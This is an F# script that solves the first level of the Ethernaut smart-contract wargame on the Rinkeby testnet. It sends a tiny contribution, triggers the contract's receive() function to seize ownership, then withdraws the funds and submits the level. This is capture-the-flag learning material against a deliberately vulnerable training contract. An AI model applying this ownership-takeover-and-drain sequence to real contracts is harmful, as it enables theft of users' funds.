#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.4.3" 


open web3.fs

// Values and partial applications
let digest = newKeccakDigest
let web3c = createWeb3Connection "http://127.0.0.1:1248" "2.0"
let constants = createDefaultConstants "0x2268b96e204379ee8366505c344ebe5cc34d3a46"
let monitor = createReceiptMonitor web3c


let call = makeEthCall web3c constants
let txn = makeEthTxn web3c constants
let ethernautContractAddress = "0xD991431D8b033ddCb84dAD257f4821E9d5b38C33"
let ethernautABI = """[{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"createLevelInstance","outputs":[],"stateMutability":"payable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"contractLevel","name":"level","type":"address"}],"name":"LevelCompletedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"player","type":"address"},{"indexed":false,"internalType":"address","name":"instance","type":"address"}],"name":"LevelInstanceCreatedLog","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"contractLevel","name":"_level","type":"address"}],"name":"registerLevel","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"addresspayable","name":"_instance","type":"address"}],"name":"submitLevelInstance","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI

// Load up our contract, set deeper partials
let deployedEthernaut = loadDeployedContract digest ethernautContractAddress RINKEBY ethernautABI |> bindDeployedContract |> List.head
let callEthernaut = call deployedEthernaut
let txnEthernaut = txn deployedEthernaut


// Get a level instance, you pass in the address of ( I guess) the base or prototype of the contract, and you
// get a copy, logged via the Event emitted inside `createLevelInstance` 
txnEthernaut (ByString "createLevelInstance") [Address "0x9CB391dbcD447E645D6Cb55dE6ca23164130D008"] "0"
|> monitorTransaction monitor
|> ignore


// Deployed to 0xd901445e1471e1e857528da6e1d9b16d51e72988
let level1ABI = """[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"contribute","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"contributions","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getContribution","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"}]""" |> ABI
let level1 = loadDeployedContract digest "0xd901445e1471e1e857528da6e1d9b16d51e72988" RINKEBY level1ABI |> bindDeployedContract |> List.head


//partials
let callLevel1 = makeEthCall web3c constants level1 
let txnLevel1 = makeEthTxn web3c constants level1


level1.functions
|> List.iter(fun p -> printfn $"functions: {p.name}, {p.hash}, {p.canonicalInputs}, {p.config}")
//functions: contribute, EVMFunctionHash "0xd7bb99ba", EVMFunctionInputs "()", Payable
//functions: contributions, EVMFunctionHash "0x42e94c90", EVMFunctionInputs "(address)", View
//functions: getContribution, EVMFunctionHash "0xf10fdf5c", EVMFunctionInputs "()", View
//functions: owner, EVMFunctionHash "0x8da5cb5b", EVMFunctionInputs "()", View
//functions: withdraw, EVMFunctionHash "0x3ccfd60b", EVMFunctionInputs "()", Nonpayable

// Clear condition: claim ownership, drain funds

//Inspect current owner
callLevel1 (ByString "owner") []
|> logCallResult
|> ignore

// [Address "0x9cb391dbcd447e645d6cb55de6ca23164130d008"]

// Looks like we need to send a small contribution, and then cause the receive() to be called, which bypasses the typical 'change ownership' check
// the contract attempts to enforce in the 'contribute' function. Otherwise, we'd need a lot of RIN!

// use our built-in to convert to wei, the call to contribute must be LESS than this
let maxpay = ("0.001" |> convertEthToWei) - 1000I
printfn $"{maxpay}"

txnLevel1 (ByString "contribute") [] $"{maxpay.ToString()}"
|> monitorTransaction monitor

// check my contribution
callLevel1 (ByString "getContribution") []
|> logCallResult

callLevel1 (ByString "owner") []
|> logCallResult
|> ignore

// Okay, let's see if we can manually call receive(), or if I have to call a non-existent function instead?
txnLevel1 (ByString "receive") [] "1000"
|> monitorTransaction monitor

//Okay, I'm the owner now, time to drain
txnLevel1 (ByString "withdraw") [] ZEROV
|> monitorTransaction monitor

txnEthernaut (ByString "submitLevelInstance") [Address "0xd901445e1471e1e857528da6e1d9b16d51e72988"] ZEROV
|> monitorTransaction monitor
